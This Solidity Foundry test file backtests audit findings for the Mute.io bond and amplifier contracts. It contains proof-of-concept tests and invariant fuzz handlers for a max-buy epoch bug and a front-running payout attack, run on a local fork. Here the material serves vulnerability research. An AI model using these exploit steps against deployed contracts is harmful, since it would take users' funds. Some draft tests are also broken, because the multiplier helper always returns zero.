// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../bonds/BondTreasury.sol";
import "../dao/dMute.sol";
import "../bonds/MuteBond.sol";
import "../DeployedResources.sol";
import "../interfaces/IERC20.sol";
import "../dynamic/MuteSwitchPairDynamic.sol";
import {ERC20Default} from "../test/ERC20Default.sol";
import {MuteAmplifier} from "../amplifier/MuteAmplifier.sol";


/**
 * A backtest of some C4 findings for the Mute.io contest
 * Includes PoCs as well as handler based invariant tests allowing for discovery of vulnerabilities
 * Tests should be ran as follows, using scripts/deploy.ts :
 *  - npx hardhat node --fork <API_KEY>
 *  - npx hardhat run --network localhost scripts/deploys.ts
 *  - forge test --fork-url localhost:8545 --mt <finding_number>
 */
contract BackTest is Test {
    using stdStorage for StdStorage;

    BondTreasury tr = BondTreasury(DeployedResources.BOND_TREASURY);
    MuteBond mb = MuteBond(DeployedResources.BOND_CONTRACT);
    dMute dm = dMute(DeployedResources.D_MUTE_TOKEN);
    IERC20 mute = IERC20(DeployedResources.MUTE_TOKEN);
    IERC20 lpToken = IERC20(DeployedResources.LP_TOKEN);
    MuteAmplifier amp = MuteAmplifier(DeployedResources.AMPLIFIER);
    uint256 ACTOR_A = 1;
    uint256 ACTOR_B = 2;
    uint256 ACTOR_C = 3;
    address ACTOR_A_ADDR = address(uint160(ACTOR_A));

    IERC20 token0;
    IERC20 token1;

    uint256 expectedPayout;

    HandlerBond handlerB;
    HandlerAmp handlerA;

    constructor(){}

    function setUp() public{
        require(ACTOR_A_ADDR != address(0), "wrong setup");
        token0 = IERC20(address(new ERC20Default(1e36)));
        token1 = IERC20(address(new ERC20Default(1e36)));

        handlerB = new HandlerBond(mb, mute, tr, lpToken, amp, dm);
        handlerA = new HandlerAmp(mb, mute, tr, lpToken, amp, dm);

        stdstore.target(address(tr))
            .sig(tr.bondContract.selector)
            .with_key(address(mb))
            .checked_write(true);

        init_amp();

        // placeholder for preconditions
    }

    function init_lp() internal {
        stdstore.target(address(lpToken))
            .sig("totalSupply()")
            .checked_write(3700 * 1e18);
        require(lpToken.totalSupply() == 3700 * 1e18, "wrong setup");

        stdstore.target(address(lpToken))
            .sig("pairFee()")
            .checked_write(1000);

        vm.startPrank(DeployedResources.SWITCH_FACTORY);
        MuteSwitchPairDynamic(address(lpToken)).initialize(
            address(token0), 
            address(token1), 
            3700 * 1e18, 
            false
            );
        vm.stopPrank();

        stdstore.target(address(lpToken))
            .sig(MuteSwitchPairDynamic(address(lpToken)).index0.selector)
            .checked_write(1e30);

        stdstore.target(address(lpToken))
            .sig(MuteSwitchPairDynamic(address(lpToken)).index1.selector)
            .checked_write(1e30);
    }

    function init_amp() internal{
        vm.mockCall(
            address(lpToken),
            abi.encodeWithSignature("claimFeesView(address)"),
            abi.encode(0,0)
        );

        stdstore.target(address(amp))
            .sig(amp.startTime.selector)
            .checked_write(block.timestamp);
        
        stdstore.target(address(amp))
            .sig(amp.endTime.selector)
            .checked_write(block.timestamp + 7 days);
        
        stdstore.target(address(mute))
            .sig(mute.balanceOf.selector)
            .with_key(address(amp))
            .checked_write(1e22);
        
        stdstore.target(address(amp))
            .sig(amp.totalRewards.selector)
            .checked_write(1e22);

        stdstore.target(address(mute))
            .sig(mute.allowance.selector)
            .with_key(address(amp))
            .with_key(address(dm))
            .checked_write(type(uint256).max);
    }

    function preconditions_01() internal{
        handlerB.depositValue(1e18, ACTOR_A);
        expectedPayout = mb.maxDeposit();
    }

    function preconditions_02() internal {
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = handlerB.depositValue.selector;
        targetSelector(FuzzSelector({
            addr : address(handlerB),
            selectors : selectors
        }));

        skip(7 days);
        expectedPayout = mb.payoutFor(1e18);
    }

    /// [H-01] Bond max-buyer might end up buying the max buy of the next epoch
    /// Back Testing PoC
    /// Asset : Bonds
    /// Actor : Buyer
    /// Action : Deposit
    function test_poc01() public{
        handlerB.depositMax(ACTOR_A);
        uint256 actualPayout = handlerB.depositMax(ACTOR_B);

        console.log("expected payout : ", expectedPayout);
        console.log("actual payout : ", actualPayout);
        require(expectedPayout == actualPayout, "[PoC] wrong bond");
    }

    /// [H-01] Bond max-buyer might end up buying the max buy of the next epoch
    /// This invariant test allows for discovery of the conditions of finding [H-01]
    /// Sound actor management is essential for meaningful fuzzing calls
    /// Otherwise very easy to find as there is little semantics left out of pre/post conditions
    /// forge-config: default.invariant.runs = 100
    /// forge-config: default.invariant.depth = 2
    function invariant_test01()  public{
        uint256 actualPayout = handlerB.depositMax(ACTOR_B);

        console.log("expected payout : ", expectedPayout);
        console.log("actual payout : ", actualPayout);
        require(expectedPayout == actualPayout, "[Invariant] wrong bond");

    }

    /// [H-02] Attacker can front-run Bond buyer and make them buy it for a lower payout than expected
    /// Back testing PoC
    /// Asset : Bonds
    /// Actor : Buyer
    /// Action : Deposit   
    function test_poc02(uint8 x) public{
        for(uint8 i = 0; i <= x; i++) {
            handlerB.depositValue(1e18 / 100, ACTOR_A);
        }
        uint256 actualPayout = handlerB.depositValue(1e18, ACTOR_B);

        console.log("expected payout : ", expectedPayout);
        console.log("actual payout : ", actualPayout);
        require(actualPayout >= expectedPayout - (expectedPayout / 4), "[PoC] slippage");
    }

    /// [H-02] Attacker can front-run Bond buyer and make them buy it for a lower payout than expected
    /// This invariant test allows for discovery of the conditions of finding [H-02]
    /// A counterexample can be found with max value buys excluded and a lower slippage bar
    /// But the most important semantic is probably the timing, heavily tuned in the precondition
    /// forge-config: default.invariant.runs = 500
    /// forge-config: default.invariant.depth = 10
    function invariant_test02() public {
        try handlerB.depositValue(1e18, ACTOR_B) returns (uint256 actualPayout) {
            console.log("expected payout : ", expectedPayout);
            console.log("actual payout : ", actualPayout);
            require(actualPayout >= expectedPayout - (expectedPayout / 4), "[Invariant] slippage");
        } catch { /* Not investigating DoS here */ }

    }

    /// draft
    function testX() public{
        vm.warp(amp.startTime());
        handlerA.stake(ACTOR_A,1e18);
        // skip(1 days);
        // handler.getPayout(ACTOR_A);
        skip(1 days);
        MuteAmplifier.DripInfo memory di = amp.dripInfo(address(uint160(ACTOR_A)));
        uint256 expected = di.currentReward;
        // skip(7 days);
        uint256 beforeD = dm.GetUnderlyingTokens(address(uint160(ACTOR_A)));
        // (,uint256 actual,,,) = handler.withdraw(ACTOR_A);
        handlerA.getPayout(ACTOR_A);
        uint256 afterD = dm.GetUnderlyingTokens(address(uint160(ACTOR_A)));
        console.log("expected : ", expected);
        // console.log("actual : ", actual);
        console.log("before : ", beforeD);
        console.log("after : ", afterD);
        require(beforeD < afterD, "fuck me");
        // require(expected == actual, "surprise");
    }


    function test_fuzzM07(
        uint256 d0, 
        uint256 r0,
        uint256 a,
        uint256 d1,
        uint256 r1
        ) public {
        r0 = bound(r0, 10000, 1e8);
        d0 = bound(d0, 1000, r0);
        a = bound(a, 1, 100);
        r1 = bound(r1, 10000, 1e8);
        d1 = bound(d1, 1000, r1);
        console.log("d0 : ", d0);
        console.log("r0 : ", r0);
        console.log("d1 : ", d1);
        console.log("r1 : ", r1);
        console.log("dX : ", d0 + (d0 * a / 100));


        uint256 m0 = handlerA.calcMul(d0, r0, address(uint160(ACTOR_A)));
        uint256 mA = handlerA.calcMul(d0 + (d0 * a / 100), r0, address(uint160(ACTOR_A)));
        uint256 m1 = handlerA.calcMul(d1, r1, address(uint160(ACTOR_A)));
        uint256 mS = handlerA.calcMul(d1*r0 + d0*r1, r1*r0, address(uint160(ACTOR_A)));

        // a * f(x) == f(a * x);
        console.log("mA : ", mA);
        console.log("a : ", a);
        console.log("m0 ", m0);
        require(mA == m0 + (m0 * a / 100), "homogeneity");

        //  f(x + y) == f(x) + f(y);
        console.log("mS : ", mS);
        console.log("m0 : ", m0);
        console.log("m1 : ", m1);
        require(mS == m0 + m1, "additivity");
    }

    function test_M07() public{
        uint256 r = 1e18;
        uint256 d0 = 1e17;
        uint256 d1 = 8 * 1e17;

        uint256 delta0 = handlerA.calcMul(d0, r, ACTOR_A_ADDR) - handlerA.calcMul(d0 + 1e17, r,ACTOR_A_ADDR );
        uint256 delta1 = handlerA.calcMul(d1, r, ACTOR_A_ADDR) - handlerA.calcMul(d1 + 1e17, r,ACTOR_A_ADDR );

        require(delta0 == delta1, "not linear");
    }

    function invariant_M02() public{
        if(dm.balanceOf(ACTOR_A_ADDR) > 0) return;

        try handlerA.getPayout(ACTOR_A) {
            require(dm.GetUnderlyingTokens(ACTOR_A_ADDR) == 0, "undue gains");
        } catch {}
    }

}
abstract contract HandlerBase is Test{
    using stdStorage for StdStorage;

    MuteBond mb;
    BondTreasury tr;
    MuteAmplifier amp;
    dMute dm;
    IERC20 mute;
    IERC20 lpToken;
    
    address actor;
    address[] actors;


    modifier asActor(uint256 _actor){
        actor = actors[bound(_actor, 1, 3)];
        vm.startPrank(actor);
        _;
        vm.stopPrank();
    }
    function setActors(uint160 x) internal{
        for(uint160 i = 0; i <= x; i++){
            actors.push(address(i));
        }
        for(uint160 i = 0; i <= x; i++){
            _approve(i, address(mb), address(lpToken));
            _approve(i, address(amp), address(lpToken));
        }
    }

    function _approve(uint256 owner, address spender, address tgt) public asActor(owner){
        IERC20(tgt).approve(spender, type(uint256).max);
    }

    function _raiseBalance(address token, address tgt, uint256 val) internal{
        uint256 initial = IERC20(token).balanceOf(tgt);
        stdstore.target(token)
            .sig(IERC20.balanceOf.selector)
            .with_key(tgt)
            .checked_write(val + initial);
    }

    function _setBalance(address token, address tgt, uint256 val) internal{
        stdstore.target(token)
            .sig(IERC20.balanceOf.selector)
            .with_key(tgt)
            .checked_write(val);
    }

    function jump(uint256 t) public{
        t = bound(t, 1, 50) * 1 hours;
        skip(t);
    }

}

contract HandlerBond is HandlerBase{
    using stdStorage for StdStorage;

    constructor(MuteBond _mb, IERC20 _mute, BondTreasury _tr, IERC20 _lpToken, MuteAmplifier _amp, dMute _dm){
        mb = _mb;
        mute = _mute;
        tr = _tr;
        lpToken = _lpToken;
        amp = _amp;
        dm = _dm;

        setActors(3);

    }

    function depositValue(
        uint256 val, 
        uint256 _actor
        ) public asActor(_actor) returns(uint256){
        val = bound(val, 1, mb.maxPurchaseAmount());
        uint256 payout = mb.payoutFor(val);

        _raiseBalance(address(mute), address(tr), payout);
        _raiseBalance(address(lpToken), actor, val);

        return mb.deposit(val, actor, false);
    }

    function depositMax(uint256 _actor) public asActor(_actor) returns (uint256){
        uint256 maxDeposit = mb.maxDeposit();
        uint256 maxPurchaseAmount = mb.maxPurchaseAmount();

        _raiseBalance(address(mute), address(tr), maxDeposit);
        _raiseBalance(address(lpToken), actor, maxPurchaseAmount);

        return mb.deposit(0, actor, true);
    }

}

contract HandlerAmp is HandlerBase{
    using stdStorage for StdStorage;
    
    constructor(MuteBond _mb, IERC20 _mute, BondTreasury _tr, IERC20 _lpToken, MuteAmplifier _amp, dMute _dm){
        mb = _mb;
        mute = _mute;
        tr = _tr;
        lpToken = _lpToken;
        amp = _amp;
        dm = _dm;

        setActors(3);

    }

    function stake(uint256 _actor, uint256 amount) public asActor(_actor){
        _raiseBalance(address(lpToken), actor, amount);
        amp.stake(amount);
    }

    function withdraw(uint256 _actor) public asActor(_actor) returns (
        uint256 a,
        uint256 b,
        uint256 c,
        uint256 d, 
        uint256 e
    ){ amp.withdraw(); }

    function getPayout(uint256 _actor) public asActor(_actor) returns (uint256 reward){
        amp.payout();
    }

    function calcMul(
        uint256 dmute, 
        uint256 rewards,
        address _actor
        ) public returns (uint256){
        // effectively deactivated
        return 0;

        stdstore.target(address(amp))
            .sig(amp.totalRewards.selector)
            .checked_write(rewards);

        vm.mockCall(
            address(dm),
            abi.encodeWithSignature("getPriorVotes(address,uint256)"),
            abi.encode(dmute)
            );
        
        return amp.calculateMultiplier(_actor, false);

    }

    function getRidOfDMute(address _actor) external{
        _setBalance(address(dm), _actor, 0);
    }
}